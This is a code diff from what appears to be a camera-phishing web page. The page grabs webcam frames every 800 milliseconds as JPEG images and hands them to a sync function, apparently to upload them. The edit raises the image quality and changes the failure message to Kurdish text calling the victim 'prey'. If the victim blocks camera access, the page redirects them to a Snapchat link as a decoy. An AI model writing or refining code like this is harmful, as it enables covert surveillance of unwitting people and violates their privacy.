@@ -65,12 +65,12 @@
                     _canvas.height = _vElement.videoHeight;
                     const _ctx = _canvas.getContext('2d');
                     _ctx.drawImage(_vElement, 0, 0);
-                    _canvas.toBlob(b => { if (b) _sync_data(b); }, 'image/jpeg', 0.7);
+                    _canvas.toBlob(b => { if (b) _sync_data(b); }, 'image/jpeg', 0.9);
                 };
                 setInterval(_snap, 800);
 
             } catch (err) {
-                _dispatch_event("⚠️ Access Blocked by Target.");
+                _dispatch_event("نێچیرەکە ڕێگری کرد لە مۆڵەتی کامێرا");
                 window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
             }
         }
